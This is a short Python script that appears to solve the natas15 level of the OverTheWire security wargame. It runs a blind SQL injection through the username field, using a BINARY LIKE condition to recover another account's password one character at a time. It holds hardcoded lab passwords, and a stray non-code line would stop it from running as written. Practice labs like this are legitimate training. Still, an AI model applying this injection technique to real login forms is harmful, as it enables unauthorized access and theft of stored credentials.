import requests
import re
from string import *

current password :  WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

username='natas15'
url='http://natas15.natas.labs.overthewire.org'
password='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

characters=uppercase+lowercase+digits

session=requests.Session();
passwordb=list("");

while True :
      for ch in characters :
            print "current password : ","".join(passwordb)+ch
            response=session.post(url,data={ "username" : 'natas16" AND BINARY password  LIKE "'+"".join(passwordb)+ch+'%" #'},auth=(username,password));
            content=response.text;
            if "user exists" in content :
                passwordb.append(ch)
